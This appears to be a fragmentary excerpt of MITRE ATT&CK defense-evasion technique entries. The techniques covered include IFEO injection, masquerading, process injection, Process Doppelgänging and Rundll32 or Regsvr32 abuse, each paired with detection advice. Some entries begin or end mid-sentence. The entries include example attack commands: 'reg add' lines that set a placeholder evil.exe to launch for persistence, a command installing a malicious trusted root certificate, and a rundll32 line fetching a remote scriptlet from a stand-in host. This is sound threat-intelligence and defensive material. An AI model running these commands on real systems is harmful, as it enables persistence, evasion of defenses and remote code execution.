        Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

        An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)

        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512</code>
        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1</code>
        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"</code>

        Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

        Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

        Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption
        can be achieved multiple ways, however most directly by defining conditions
        using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly
        with the registry to make alterations.\n\nIn the case of network-based reporting
        of indicators, an adversary may block traffic associated with reporting to
        prevent central analysis. This may be accomplished by many means, such as
        stopping a local process responsible for forwarding telemetry and/or creating
        a host-based firewall rule to block traffic to specific hosts responsible
        for aggregating events, such as security information and event management
        (SIEM) products. "

        Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.

        Depending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: <code>HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AUTOLOGGER_NAME\{PROVIDER_GUID}</code>

      description: |-
        If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.

        A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.

        should be treated as an indication of a potentially more invasive intrusion.
        The alerting system should be thoroughly investigated beyond that initial
        alert for activity that was not detected. Adversaries may continue with an
        operation, assuming that individual events like an anti-virus detect will
        not be investigated or that an analyst will not be able to conclusively link
        that event to other activity occurring on the network.

      name: Install Root Certificate
      description: |-
        Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.

        Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)

        Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)

        Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)

        In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)

        A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. (Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl. (Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List. (Citation: Microsoft Sigcheck May 2017)

        Installed root certificates are located in the Registry under <code>HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\</code> and <code>[HKLM or HKCU]\Software[\Policies\]\Microsoft\SystemCertificates\Root\Certificates\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison: (Citation: Tripwire AppUNBlocker)

        InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>. InstallUtil.exe is digitally signed by Microsoft.

        Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>.

        signature for the file and can be detected. Collect running process information
        and compare against known applications to look for suspicious behavior.

      name: Masquerading
      description: |-
        Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.

        One variant is for an executable to be placed in a commonly trusted directory or given the name of a legitimate, trusted program. Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous. An example of this is when a common system utility or program is moved and renamed to avoid detection based on its usage.(Citation: FireEye APT10 Sept 2018) This is done to bypass tools that trust executables by relying on file name or path, as well as to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.

        A third variant uses the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows screensaver file named <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>. A common use of this technique is with spearphishing attachments since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default. 

        Adversaries may modify a binary's metadata, including such fields as icons, version, name of the product, description, and copyright, to better blend in with the environment and increase chances of deceiving a security analyst or product.(Citation: Threatexpress MetaTwin 2017)

        ### Windows
        In another variation of this technique, an adversary may use a renamed copy of a legitimate utility, such as rundll32.exe. (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is moved to a different directory and also renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)

        An example of abuse of trusted locations in Windows would be the <code>C:\Windows\System32</code> directory. Examples of trusted binary names that can be given to malicious binares include "explorer.exe" and "svchost.exe".

        ### Linux
        Another variation of this technique includes malicious binaries changing the name of their running process to that of a trusted or benign process, after they have been launched as opposed to before. (Citation: Remaiten)

        An example of abuse of trusted locations in Linux  would be the <code>/bin</code> directory. Examples of trusted binary names that can be given to malicious binaries include "rsyncd" and "dbus-inotifier". (Citation: Fysbis Palo Alto Analysis)  (Citation: Fysbis Dr Web Analysis)

        Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.

        If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Endgame Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)

        For RTLO, detection methods should include looking for common formats of RTLO characters within filenames such as "\u202E", "[U+202E]", and "%E2%80%AE". Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the a file containing it.

        Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in Persistence and Execution.

        Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API (see examples).

        Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to establish Persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)

        The Registry of a remote system may be modified to aid in execution of files as part of Lateral Movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) for RPC communication.

        Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.

        Monitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.

        Monitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).

        Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

        Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious.

        Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)

        Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)

        Forensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the ZwSetEaFile and ZwQueryEaFile Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)

        There are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]</code>) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.

        The Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir /r</code> command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream</code> parameter to interact with ADSs.

      description: |-
        Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

        Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.

        Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

        Adversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)

        Another example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.

        Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).

        Flag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016)

        Obfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection.

      name: Parent PID Spoofing
      description: |-
        Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)

        Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via VBA [Scripting](https://attack.mitre.org/techniques/T1064) within a malicious Office document or any code that can perform [Execution through API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)

        Explicitly assigning the PPID may also enable [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) (given appropriate access rights to the parent process). For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)

        Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)

        Monitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.

        File system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like "Knock Knock" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.

        Monitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.

      description: "Port Knocking is a well-established method used by both defenders
        and adversaries to hide open ports from access. To enable a port, an adversary
        sends a series of packets with certain characteristics before the port will
        be opened. Usually this series of packets consists of attempted connections
        to a predefined sequence of closed ports, but can involve unusual flags, specific
        strings or other unique characteristics. After the sequence is completed,
        opening a port is often accomplished by the host based firewall, but could
        also be implemented by custom software. \n\nThis technique has been observed
        to both for the dynamic opening of a listening port as well as the initiating
        of a connection to a listening server on a different system.\n\nThe observation
        of the signal packets to trigger the communication can be conducted through
        different methods. One means, originally implemented by Cd00r (Citation: Hartrell
        cd00r 2002), is to use the libpcap libraries to sniff for the packets in question.
        Another method leverages raw sockets, which enables the malware to use ports
        that are already open for use by other programs."

      description: |-
        Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)

        Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)

        Adversaries may leverage TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055) called Process Doppelgänging. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), Process Doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process Doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. (Citation: BlackHat Process Doppelgänging Dec 2017)

        Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):

        * Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.
        * Load – Create a shared section of memory and load the malicious executable.
        * Rollback – Undo changes to original executable, effectively removing malicious code from the file system.
        * Animate – Create a process from the tainted section of memory and initiate execution.

        Monitor and analyze calls to CreateTransaction, CreateFileTransacted, RollbackTransaction, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to NtCreateProcessEx and NtCreateThreadEx as well as API calls used to modify memory within another process, such as WriteProcessMemory. (Citation: BlackHat Process Doppelgänging Dec 2017) (Citation: hasherezade Process Doppelgänging Dec 2017)

        Scan file objects reported during the PsSetCreateProcessNotifyRoutine, (Citation: Microsoft PsSetCreateProcessNotifyRoutine routine) which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access. (Citation: BlackHat Process Doppelgänging Dec 2017) Also consider comparing file objects loaded in memory to the corresponding file on disk. (Citation: hasherezade Process Doppelgänging Dec 2017)

        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.

      name: Process Injection
      description: |-
        Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

        ### Windows

        There are multiple approaches to injecting code into a live process. Windows implementations include: (Citation: Endgame Process Injection July 2017)

        * **Dynamic-link library (DLL) injection** involves writing the path to a malicious DLL inside a process then invoking execution by creating a remote thread.
        * **Portable executable injection** involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. (Citation: Endgame HuntingNMemory June 2017)
        * **Thread execution hijacking** involves injecting malicious code or the path to a DLL into a thread of a process. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), the thread must first be suspended.
        * **Asynchronous Procedure Call** (APC) injection involves attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A variation of APC injection, dubbed "Early Bird injection", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018)  AtomBombing  (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table. (Citation: Microsoft Atom Table)
        * **Thread Local Storage** (TLS) callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. (Citation: FireEye TLS Nov 2017)

        ### Mac and Linux

        Implementations for Linux and OS X/macOS systems include: (Citation: Datawire Code Injection) (Citation: Uninformed Needle)

        * **LD_PRELOAD, LD_LIBRARY_PATH** (Linux), **DYLD_INSERT_LIBRARIES** (Mac OS X) environment variables, or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) in a process which can be used to intercept API calls from the running process. (Citation: Phrack halfdead 1997)
        * **Ptrace system calls** can be used to attach to a running process and modify it in runtime. (Citation: Uninformed Needle)
        * **/proc/[pid]/mem** provides access to the memory of the process and can be used to read/write arbitrary data to it. This technique is very rare due to its complexity. (Citation: Uninformed Needle)
        * **VDSO hijacking** performs runtime injection on ELF binaries by manipulating code stubs mapped in from the linux-vdso.so shared object. (Citation: VDSO hijack 2009)

        Malware commonly utilizes process injection to access system resources through which Persistence and other environment modifications can be made. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.

        Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique. (Citation: Endgame Process Injection July 2017)

        Monitoring for Linux specific calls such as the ptrace system call, the use of LD_PRELOAD environment variable, or dlfcn dynamic linking API calls, should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods. (Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits)

        Monitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules. (Citation: Microsoft Sysmon v6 May 2017)

        Monitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [PowerShell](https://attack.mitre.org/techniques/T1086) with tools such as PowerSploit, (Citation: Powersploit) so additional PowerShell monitoring may be required to cover known implementations of this behavior.

        Existing methods of detecting remote access tools are helpful. Backup remote access tools or other access points may not have established command and control channels open during an intrusion, so the volume of data transferred may not be as high as the primary channel unless access is lost.

        Detection of tools based on beacon traffic, Command and Control protocol, or adversary infrastructure require prior threat intelligence on tools, IP addresses, and/or domains the adversary may use, along with the ability to detect use at the network boundary. Prior knowledge of indicators of compromise may also help detect adversary tools at the endpoint if tools are available to scan for those indicators.

        If an intrusion is in progress and sufficient endpoint data or decoded command and control traffic is collected, then defenders will likely be able to detect additional tools dropped as the adversary is conducting the operation.

        For alternative access using externally accessible VPNs or remote services, follow detection recommendations under [Valid Accounts](https://attack.mitre.org/techniques/T1078) and [External Remote Services](https://attack.mitre.org/techniques/T1133) to collect account use information.

        Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

        Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.

        Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

        Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

        Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

        Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)

        The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

        Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

        Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks.

      name: SIP and Trust Provider Hijacking
      description: |-
        In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)

